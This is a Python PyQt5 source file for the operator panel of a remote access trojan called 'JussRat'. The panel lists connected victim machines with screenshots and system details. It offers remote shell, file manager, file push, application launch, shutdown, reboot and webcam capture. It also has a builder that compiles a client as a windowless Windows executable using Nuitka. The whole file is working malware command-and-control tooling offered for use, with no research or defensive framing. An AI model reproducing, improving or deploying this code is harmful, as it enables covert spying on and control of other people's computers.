import sys
import os
import json
import base64
import io
import logging
import subprocess
from PIL import Image
from PyQt5.QtWidgets import (
    QApplication, QMainWindow, QTableWidget, QTableWidgetItem, QHeaderView,
    QVBoxLayout, QWidget, QMenu, QMessageBox, QTabWidget, QLabel,
    QLineEdit, QPushButton, QComboBox, QFormLayout, QInputDialog, QFileDialog
)
from PyQt5.QtGui import QIcon, QPixmap, QImage
from PyQt5.QtCore import Qt, QTimer, pyqtSignal
from functools import partial
from client_manager import ClientManager
from file_manager import FileManagerWindow
from server_network import ServerNetwork
from remote_shell import RemoteShellDialog

class ServerGUI(QMainWindow):
    open_file_manager_signal = pyqtSignal(str, object, str, object)
    shell_response_signal = pyqtSignal(str, str)

    def __init__(self):
        super().__init__()
        self.original_title = f"JussRat Official! 1.2"
        self.setWindowTitle(self.original_title)
        self.setGeometry(100, 100, 1200, 800)
        icon_path = os.path.join(os.path.dirname(__file__), "juss.png")
        if os.path.exists(icon_path):
            self.setWindowIcon(QIcon(icon_path))
        self.clients = {}
        self.file_managers = {}
        self.client_screenshots = {}
        self.shell_windows = {}
        self.client_manager = ClientManager(self)
        self.port, self.theme = self.load_config()
        self.server_network = ServerNetwork(self, self.port)
        self.animation_timer = QTimer(self)
        self.animation_timer.timeout.connect(self.animate_title)
        self.animation_step = 0
        self.animation_direction = 1
        self.start_title_animation()
        self._init_ui()
        self.open_file_manager_signal.connect(self._open_file_manager, Qt.QueuedConnection)
        self.shell_response_signal.connect(self._handle_shell_response, Qt.QueuedConnection)
        self.change_theme(self.theme)
        self.server_network.start_server()

    def _init_ui(self):
        central_widget = QWidget()
        self.setCentralWidget(central_widget)
        layout = QVBoxLayout(central_widget)
        self.tab_widget = QTabWidget()
        layout.addWidget(self.tab_widget)
        self._init_clients_tab()
        self._init_settings_tab()
        self._init_builder_tab()
        self._init_about_tab()
        self._init_styles()

    def _init_clients_tab(self):
        clients_widget = QWidget()
        clients_layout = QVBoxLayout(clients_widget)
        self.table = QTableWidget()
        self.table.setColumnCount(6)
        self.table.setHorizontalHeaderLabels(['Screenshot', 'IP', 'GPU', 'CPU', 'RAM', 'OS'])
        self.table.horizontalHeader().setSectionResizeMode(QHeaderView.Stretch)
        self.table.setColumnWidth(0, 500)
        self.table.setSelectionMode(QTableWidget.SingleSelection)
        self.table.setContextMenuPolicy(Qt.CustomContextMenu)
        self.table.customContextMenuRequested.connect(self.show_context_menu)
        self.table.setRowCount(0)
        self.context_menu = QMenu(self)
        self.context_menu.addAction("Shutdown", self.shutdown_client)
        self.context_menu.addAction("Reboot", self.reboot_client)
        self.context_menu.addAction("Open Application", self.open_application)
        self.context_menu.addAction("Send File", self.send_file)
        self.context_menu.addAction("Remote Shell", self.remote_shell)
        self.context_menu.addAction("File Manager", self.file_manager)
        self.context_menu.addAction("Capture Camera", self.capture_camera)
        clients_layout.addWidget(self.table)
        self.tab_widget.addTab(clients_widget, "Clients")

    def _init_settings_tab(self):
        settings_widget = QWidget()
        settings_layout = QFormLayout(settings_widget)
        self.port_input = QLineEdit(str(self.port))
        self.theme_combo = QComboBox()
        self.theme_combo.addItems(["Light", "Dark"])
        self.theme_combo.setCurrentText(self.theme)
        self.theme_combo.currentTextChanged.connect(self.change_theme)
        apply_button = QPushButton("Apply")
        apply_button.clicked.connect(self.apply_config)
        settings_layout.addRow("Server Port:", self.port_input)
        settings_layout.addRow("Theme:", self.theme_combo)
        settings_layout.addRow("", apply_button)
        self.tab_widget.addTab(settings_widget, "Settings")

    def _init_builder_tab(self):
        builder_widget = QWidget()
        builder_layout = QFormLayout(builder_widget)
        self.ip_input = QLineEdit("127.0.0.1")
        self.builder_port_input = QLineEdit(str(self.port))
        self.build_type_combo = QComboBox()
        self.build_type_combo.addItems(["Python (.py)", "Executable (.exe)"])
        build_button = QPushButton("Build Client")
        build_button.clicked.connect(self.build_client)
        builder_layout.addRow("Server IP:", self.ip_input)
        builder_layout.addRow("Server Port:", self.builder_port_input)
        builder_layout.addRow("Build Type:", self.build_type_combo)
        builder_layout.addRow("", build_button)
        self.tab_widget.addTab(builder_widget, "Builder")

    def _init_about_tab(self):
        about_widget = QWidget()
        about_layout = QVBoxLayout(about_widget)
        about_layout.setAlignment(Qt.AlignCenter)
        image_label = QLabel()
        image_path = os.path.join(os.path.dirname(__file__), "juss.png")
        if os.path.exists(image_path):
            pixmap = QPixmap(image_path)
            image_label.setPixmap(pixmap.scaled(200, 200, Qt.KeepAspectRatio))
        else:
            image_label.setText("juss.png not found")
        image_label.setAlignment(Qt.AlignCenter)
        about_layout.addWidget(image_label)
        about_text = QLabel("All done by DBGCORE.DLL!")
        about_text.setAlignment(Qt.AlignCenter)
        about_layout.addWidget(about_text)
        about_layout.addStretch()
        official_text = QLabel("JussRat Official")
        official_text.setAlignment(Qt.AlignCenter)
        about_layout.addWidget(official_text)
        self.tab_widget.addTab(about_widget, "About")

    def _init_styles(self):
        style = """
        QWidget {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            font-size: 14px;
            border-radius: 8px;
        }
        QTabWidget {
            background: transparent;
        }
        QTabBar::tab {
            background-color: #f0f0f0;
            color: #222;
            padding: 8px 16px;
            border-top-left-radius: 8px;
            border-top-right-radius: 8px;
            margin: 2px;
        }
        QTabBar::tab:selected {
            background-color: #ffffff;
            border: 2px solid #d0d0d0;
            margin-bottom: -2px;
        }
        QTableWidget {
            background-color: #ffffff;
            border-radius: 8px;
            gridline-color: #ddd;
        }
        QHeaderView::section {
            background-color: #f5f5f5;
            border: none;
            padding: 4px;
            border-radius: 4px;
        }
        QTableWidget::item {
            padding: 8px;
            border-radius: 4px;
        }
        QPushButton {
            background-color: #4CAF50;
            color: white;
            padding: 8px 16px;
            border-radius: 8px;
            border: none;
        }
        QPushButton:hover {
            background-color: #45a049;
        }
        QLineEdit, QComboBox {
            border: 1px solid #ccc;
            border-radius: 8px;
            padding: 6px 10px;
            background-color: #fff;
        }
        QLabel {
            color: #222;
        }
        QMainWindow {
            background-color: #f9f9f9;
        }
        """
        self._apply_stylesheet(style)

    def _apply_stylesheet(self, style_str):
        QApplication.instance().setStyleSheet(style_str)

    def load_config(self):
        path = os.path.join(os.path.dirname(__file__), "info.txt")
        default_port = 12345
        default_theme = "Light"
        try:
            if os.path.exists(path):
                with open(path, 'r') as f:
                    config = json.load(f)
                    port = int(config.get('port', default_port))
                    theme = config.get('theme', default_theme)
                    if 1024 <= port <= 65535 and theme in ["Light", "Dark"]:
                        return port, theme
        except:
            pass
        port, ok1 = QInputDialog.getInt(self, "Port", "Enter server port (1024-65535):", default_port, 1024, 65535)
        if not ok1:
            port = default_port
        theme, ok2 = QInputDialog.getItem(self, "Theme", "Select theme:", ["Light", "Dark"], 0, False)
        if not ok2:
            theme = default_theme
        try:
            with open(path, 'w') as f:
                json.dump({'port': port, 'theme': theme}, f)
        except:
            pass
        return port, theme

    def start_title_animation(self):
        self.animation_timer.start(100)

    def animate_title(self):
        if not hasattr(self, 'original_title'):
            self.original_title = "JussRat Official!"
        if self.animation_direction == 1:
            if self.animation_step >= len(self.original_title):
                self.animation_direction = -1
                self.animation_step = len(self.original_title)
            else:
                self.setWindowTitle(self.original_title[:self.animation_step] + " ")
                self.animation_step += 1
        else:
            if self.animation_step <= 0:
                self.animation_direction = 1
                self.animation_step = 0
            else:
                self.setWindowTitle(self.original_title[:self.animation_step] + " ")
                self.animation_step -= 1

    def change_theme(self, theme):
        self.theme = theme
        style = """
        QWidget {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            font-size: 14px;
            border-radius: 8px;
        }
        QTabWidget {
            background: transparent;
        }
        QTabBar::tab {
            background-color: #f0f0f0;
            color: #222;
            padding: 8px 16px;
            border-top-left-radius: 8px;
            border-top-right-radius: 8px;
            margin: 2px;
        }
        QTabBar::tab:selected {
            background-color: #ffffff;
            border: 2px solid #d0d0d0;
            margin-bottom: -2px;
        }
        QTableWidget {
            background-color: #ffffff;
            border-radius: 8px;
            gridline-color: #ddd;
        }
        QHeaderView::section {
            background-color: #f5f5f5;
            border: none;
            padding: 4px;
            border-radius: 4px;
        }
        QTableWidget::item {
            padding: 8px;
            border-radius: 4px;
        }
        QPushButton {
            background-color: #4CAF50;
            color: white;
            padding: 8px 16px;
            border-radius: 8px;
            border: none;
        }
        QPushButton:hover {
            background-color: #45a049;
        }
        QLineEdit, QComboBox {
            border: 1px solid #ccc;
            border-radius: 8px;
            padding: 6px 10px;
            background-color: #fff;
        }
        QLabel {
            color: #222;
        }
        QMainWindow {
            background-color: #f9f9f9;
        }
        """
        if theme == "Dark":
            dark_style = """
            QWidget {
                background-color: #2b2b2b;
                color: #ffffff;
                border-radius: 8px;
                border: 1px solid #555555;
            }
            QTabWidget {
                background: transparent;
            }
            QTabBar::tab {
                background-color: #333333;
                color: #ffffff;
                padding: 8px 16px;
                border-top-left-radius: 8px;
                border-top-right-radius: 8px;
                margin: 2px;
            }
            QTabBar::tab:selected {
                background-color: #444444;
                border: 2px solid #555555;
                margin-bottom: -2px;
            }
            QTableWidget {
                background-color: #3b3b3b;
                border-radius: 8px;
                gridline-color: #555555;
                border: 1px solid #555555;
            }
            QHeaderView::section {
                background-color: #444444;
                border: none;
                padding: 4px;
                border-radius: 4px;
            }
            QTableWidget::item {
                padding: 8px;
                border-radius: 4px;
            }
            QPushButton {
                background-color: #555555;
                color: #ffffff;
                padding: 8px 16px;
                border-radius: 8px;
                border: 1px solid #555555;
            }
            QPushButton:hover {
                background-color: #666666;
            }
            QLineEdit, QComboBox {
                border: 1px solid #555555;
                border-radius: 8px;
                padding: 6px 10px;
                background-color: #555555;
                color: #ffffff;
            }
            QLabel {
                color: #ffffff;
            }
            QMainWindow {
                background-color: #2b2b2b;
                border: 1px solid #555555;
            }
            """
            self._apply_stylesheet(style + dark_style)
        else:
            self._apply_stylesheet(style)

    def apply_config(self):
        port_text = self.port_input.text()
        theme = self.theme_combo.currentText()
        try:
            port = int(port_text)
            if 1024 <= port <= 65535:
                self.server_network.update_port(port)
                path = os.path.join(os.path.dirname(__file__), "info.txt")
                with open(path, 'w') as f:
                    json.dump({'port': port, 'theme': theme}, f)
                self.port = port
                self.change_theme(theme)
                QMessageBox.information(self, "Success", "Settings applied.")
            else:
                QMessageBox.warning(self, "Invalid", "Port must be 1024-65535.")
        except:
            QMessageBox.warning(self, "Invalid", "Enter a valid port number.")

    def build_client(self):
        ip = self.ip_input.text().strip()
        port_text = self.builder_port_input.text().strip()
        build_type = self.build_type_combo.currentText()

        # Validate IP address
        if not ip or not all(part.isdigit() and 0 <= int(part) <= 255 for part in ip.split('.') if len(ip.split('.')) == 4):
            QMessageBox.warning(self, "Invalid Input", "Please enter a valid IP address (e.g., 192.168.1.1).")
            return

        # Validate port
        try:
            port = int(port_text)
            if not (1024 <= port <= 65535):
                QMessageBox.warning(self, "Invalid Input", "Port must be between 1024 and 65535.")
                return
        except ValueError:
            QMessageBox.warning(self, "Invalid Input", "Please enter a valid port number.")
            return

        template_path = os.path.join(os.path.dirname(__file__), "client.py")
        saved_dir = os.path.join(os.path.dirname(__file__), "saved")
        output_base = f"client_{ip}_{port}"

        if not os.path.exists(template_path):
            QMessageBox.critical(self, "Error", f"Template file 'client.py' not found at {template_path}.")
            return

        try:
            os.makedirs(saved_dir, exist_ok=True)
            with open(template_path, 'r', encoding='utf-8') as f:
                content = f.read()
            content = content.replace('%ip%', ip)
            content = content.replace('%port%', str(port))

            if build_type == "Python (.py)":
                output_path = os.path.join(saved_dir, f"{output_base}.py")
                with open(output_path, 'w', encoding='utf-8') as f:
                    f.write(content)
                QMessageBox.information(self, "Success", f"Client file generated successfully at {output_path}.")
            else:  # Executable (.exe)
                temp_path = os.path.join(saved_dir, f"{output_base}_temp.py")
                with open(temp_path, 'w', encoding='utf-8') as f:
                    f.write(content)

                output_path = os.path.join(saved_dir, f"{output_base}.exe")
                try:
                    # Check if Nuitka is installed
                    subprocess.run(["nuitka", "--version"], check=True, capture_output=True)
                except (subprocess.CalledProcessError, FileNotFoundError):
                    QMessageBox.critical(self, "Error", "Nuitka is not installed. Please install it using 'pip install nuitka'.")
                    return

                # Build with Nuitka: onefile, no console, include necessary modules
                nuitka_cmd = [
                    "nuitka",
                    "--onefile",
                    "--windows-disable-console",
                    "--output-dir=" + saved_dir,
                    "--include-module=client_manager",
                    "--include-module=server_network",
                    "--include-module=remote_shell",
                    temp_path
                ]
                try:
                    subprocess.run(nuitka_cmd, check=True, capture_output=True, text=True)
                    os.remove(temp_path)  # Clean up temporary file
                    QMessageBox.information(self, "Success", f"Client executable generated successfully at {output_path}.")
                except subprocess.CalledProcessError as e:
                    QMessageBox.critical(self, "Error", f"Failed to compile executable: {e.stderr}")
                    if os.path.exists(temp_path):
                        os.remove(temp_path)
                    return

        except Exception as e:
            QMessageBox.critical(self, "Error", f"Failed to generate client file: {str(e)}")

    def show_context_menu(self, pos):
        index = self.table.indexAt(pos)
        if index.isValid():
            self.selected_client = self.table.item(index.row(), 0).data(Qt.UserRole)
            self.context_menu.exec_(self.table.viewport().mapToGlobal(pos))

    def add_client(self, client_id, socket, info):
        if self.is_duplicate_client(info):
            return False
        self.clients[client_id] = {'socket': socket, 'info': info}
        row = self.table.rowCount()
        self.table.insertRow(row)
        item = QTableWidgetItem()
        item.setData(Qt.UserRole, client_id)
        self.table.setItem(row, 0, item)
        self.table.setItem(row, 1, QTableWidgetItem(info.get('ip', '')))
        self.table.setItem(row, 2, QTableWidgetItem(info.get('gpu', '')))
        self.table.setItem(row, 3, QTableWidgetItem(info.get('cpu', '')))
        self.table.setItem(row, 4, QTableWidgetItem(info.get('ram', '')))
        self.table.setItem(row, 5, QTableWidgetItem(info.get('os', '')))
        self.table.setRowHeight(row, 400)
        return True

    def is_duplicate_client(self, info):
        for c in self.clients.values():
            existing = c['info']
            if (existing.get('ip') == info.get('ip') and
                existing.get('gpu') == info.get('gpu') and
                existing.get('cpu') == info.get('cpu') and
                existing.get('ram') == info.get('ram') and
                existing.get('os') == info.get('os')):
                return True
        return False

    def update_screenshot(self, client_id, image_data):
        if client_id not in self.clients:
            return
        if not image_data.startswith('iVBOR'):
            return
        try:
            img_bytes = base64.b64decode(image_data)
            img = Image.open(io.BytesIO(img_bytes))
            qimg = QImage(img.tobytes(), img.width, img.height, img.width * 3, QImage.Format_RGB888)
            pixmap = QPixmap.fromImage(qimg)
            pixmap = pixmap.scaled(500, 400, Qt.KeepAspectRatio, Qt.SmoothTransformation)
            self.client_screenshots[client_id] = pixmap
            for row in range(self.table.rowCount()):
                if self.table.item(row, 0).data(Qt.UserRole) == client_id:
                    item = QTableWidgetItem()
                    item.setData(Qt.UserRole, client_id)
                    item.setIcon(QIcon(pixmap))
                    self.table.setItem(row, 0, item)
                    self.table.setRowHeight(row, 400)
                    break
        except Exception as e:
            print(f"Error updating screenshot: {e}")

    def shutdown_client(self):
        if hasattr(self, 'selected_client'):
            cid = self.selected_client
            if cid in self.clients:
                try:
                    self.client_manager.shutdown_client(cid)
                    QMessageBox.information(self, "Success", f"Shutdown command sent to client {cid}.")
                except Exception as e:
                    logging.error(f"Failed to shutdown client {cid}: {str(e)}")
                    QMessageBox.critical(self, "Error", f"Failed to shutdown client {cid}: {str(e)}")

    def reboot_client(self):
        if hasattr(self, 'selected_client'):
            cid = self.selected_client
            if cid in self.clients:
                try:
                    self.client_manager.reboot_client(cid)
                    QMessageBox.information(self, "Success", f"Reboot command sent to client {cid}.")
                except Exception as e:
                    logging.error(f"Failed to reboot client {cid}: {str(e)}")
                    QMessageBox.critical(self, "Error", f"Failed to reboot client {cid}: {str(e)}")

    def open_application(self):
        if hasattr(self, 'selected_client'):
            cid = self.selected_client
            if cid in self.clients:
                try:
                    app_path, ok = QInputDialog.getText(self, "Open Application", "Enter application path:")
                    if ok and app_path:
                        self.client_manager.open_application(cid, app_path)
                        QMessageBox.information(self, "Success", f"Application open command sent to client {cid}.")
                except Exception as e:
                    logging.error(f"Failed to open application for client {cid}: {str(e)}")
                    QMessageBox.critical(self, "Error", f"Failed to open application for client {cid}: {str(e)}")

    def send_file(self):
        if hasattr(self, 'selected_client'):
            cid = self.selected_client
            if cid in self.clients:
                try:
                    file_path, _ = QFileDialog.getOpenFileName(self, "Select File to Send", "", "All Files (*)")
                    if file_path:
                        self.client_manager.send_file(cid)
                        QMessageBox.information(self, "Success", f"File {file_path} sent to client {cid}.")
                except Exception as e:
                    logging.error(f"Failed to send file to client {cid}: {str(e)}")
                    QMessageBox.critical(self, "Error", f"Failed to send file to client {cid}: {str(e)}")

    def remote_shell(self):
        if hasattr(self, 'selected_client'):
            cid = self.selected_client
            if cid in self.clients:
                try:
                    if cid not in self.shell_windows:
                        shell_window = RemoteShellDialog(cid, self.client_manager)
                        self.shell_windows[cid] = shell_window
                        shell_window.show()
                    else:
                        self.shell_windows[cid].raise_()
                    command, ok = QInputDialog.getText(self, "Remote Shell", "Enter shell command:")
                    if ok and command:
                        self.client_manager.remote_shell(cid, command)
                        QMessageBox.information(self, "Success", f"Shell command sent to client {cid}.")
                except Exception as e:
                    logging.error(f"Failed to execute remote shell for client {cid}: {str(e)}")
                    QMessageBox.critical(self, "Error", f"Failed to execute remote shell for client {cid}: {str(e)}")
            else:
                logging.warning(f"Client ID={cid} not found for remote shell")
                QMessageBox.critical(self, "Error", f"Client ID={cid} not found")

    def _handle_shell_response(self, client_id, response):
        try:
            if client_id in self.shell_windows:
                self.shell_windows[client_id].append_output(response)
                QMessageBox.information(self, "Shell Response", f"Received response from client {client_id}:\n{response}")
            else:
                logging.warning(f"No shell window found for client ID={client_id} to handle response")
        except Exception as e:
            logging.error(f"Error handling shell response for client {client_id}: {str(e)}")
            QMessageBox.critical(self, "Error", f"Error handling shell response: {str(e)}")

    def file_manager(self):
        if hasattr(self, 'selected_client'):
            cid = self.selected_client
            if cid in self.clients:
                try:
                    self.open_file_manager_signal.emit(cid, self.clients[cid]['socket'], self.clients[cid]['info'].get('ip', ''), self)
                    QMessageBox.information(self, "Success", f"File manager opened for client {cid}.")
                except Exception as e:
                    logging.error(f"Failed to open file manager for client {cid}: {str(e)}")
                    QMessageBox.critical(self, "Error", f"Failed to open file manager for client {cid}: {str(e)}")

    def _open_file_manager(self, client_id, socket, ip, parent):
        try:
            if client_id not in self.file_managers:
                self.file_managers[client_id] = FileManagerWindow(client_id, socket, ip, parent)
                QApplication.processEvents()
                self.file_managers[client_id].show()
            else:
                self.file_managers[client_id].raise_()
        except Exception as e:
            logging.error(f"Error opening file manager for client {client_id}: {str(e)}")
            QMessageBox.critical(self, "Error", f"Error opening file manager: {str(e)}")

    def capture_camera(self):
        if hasattr(self, 'selected_client'):
            cid = self.selected_client
            if cid in self.clients:
                try:
                    self.client_manager.capture_camera(cid)
                    QMessageBox.information(self, "Success", f"Camera capture command sent to client {cid}.")
                except Exception as e:
                    logging.error(f"Failed to capture camera for client {cid}: {str(e)}")
                    QMessageBox.critical(self, "Error", f"Failed to capture camera for client {cid}: {str(e)}")

if __name__ == "__main__":
    app = QApplication(sys.argv)
    window = ServerGUI()
    window.show()
    sys.exit(app.exec_())